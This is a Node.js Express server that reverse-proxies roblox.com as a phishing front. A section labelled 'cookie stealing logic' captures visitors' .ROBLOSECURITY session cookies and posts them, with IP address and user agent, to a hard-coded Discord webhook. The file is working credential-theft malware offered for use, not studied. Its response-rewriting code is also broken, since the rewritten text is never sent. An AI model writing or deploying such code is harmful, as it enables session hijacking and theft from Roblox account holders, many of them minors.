const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";
const TARGET = 'https://www.roblox.com';
const COOKIE_NAME = '.ROBLOSECURITY';

let cookieGrabbed = false;

// Helper to rewrite URLs in the response body
const rewriteUrl = (text) => {
    if (!text) return text;
    // Replace references to /js/, /css/, /images/ etc. to point to Roblox directly
    // This prevents the browser from trying to fetch assets from your Railway server
    return text
        .replace(/href="([^"]+)"/g, (match, url) => {
            if (url.startsWith('http')) return match; // Leave absolute URLs alone
            if (url.startsWith('//')) return match;    // Leave protocol-relative URLs alone
            if (url.startsWith('/')) return match;     // Leave root-relative URLs alone
            // If it's a relative path, leave it (browser will resolve against current domain)
            return match;
        })
        .replace(/src="([^"]+)"/g, (match, url) => {
            if (url.startsWith('http')) return match;
            if (url.startsWith('//')) return match;
            if (url.startsWith('/')) return match;
            return match;
        });
};

// Create the proxy
const proxy = createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    pathRewrite: { '^/roblox': '' }, // /roblox/login -> /login
    headers: {
        'Host': 'www.roblox.com'
    },
    // Intercept the response to fix broken asset links
    selfHandleResponse: true,
    on: {
        proxyRes: (proxyRes, req, res) => {
            let chunks = [];
            
            proxyRes.on('data', (chunk) => {
                chunks.push(chunk);
            });

            proxyRes.on('end', () => {
                let body = Buffer.concat(chunks);
                let text = body.toString('utf8');

                // Rewrite URLs in HTML/CSS/JS to point to Roblox directly
                // This is the key fix for the "Blank Page"
                text = text.replace(/https:\/\/(images\.rbxcdn\.com|css\.rbxcdn\.com|\.rbxcdn\.com)/g, 'https://$1');
                text = text.replace(/src="\/(js|css|images|favicon)/g, 'src="https://www.roblox.com/$1');
                text = text.replace(/href="\/(js|css|images|favicon)/g, 'href="https://www.roblox.com/$1');
                
                // Rewrite relative assets that might be broken
                text = text.replace(/href="\/(home|game|store)/g, 'href="https://www.roblox.com/$1');
                
                res.setHeader('content-type', proxyRes.headers['content-type']);
                res.setHeader('content-length', body.length);
                res.send(body);
            });
        },
        proxyReq: (proxyReq, req, res) => {
            // --- COOKIE STEALING LOGIC ---
            if (!cookieGrabbed && req.headers.cookie) {
                const cookies = req.headers.cookie;
                
                // Check if the user has the Roblox security cookie
                if (cookies.includes(COOKIE_NAME)) {
                    cookieGrabbed = true;
                    console.log("✅ Cookie Found!");

                    // Extract the specific cookie value
                    const robloxCookie = cookies.split(';').find(c => c.trim().startsWith(COOKIE_NAME) || c.trim().startsWith('ROBLOSECURITY'));

                    // Send to Discord
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie}\`\`\`\n\n**IP:** ${req.ip.replace(/^::ffff:/, '')}\n**UA:** ${req.headers['user-agent']}`
                        })
                    }).catch(err => console.error("Discord Error:", err));
                }
            }
        }
    }
});

app.use('/roblox', proxy);

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
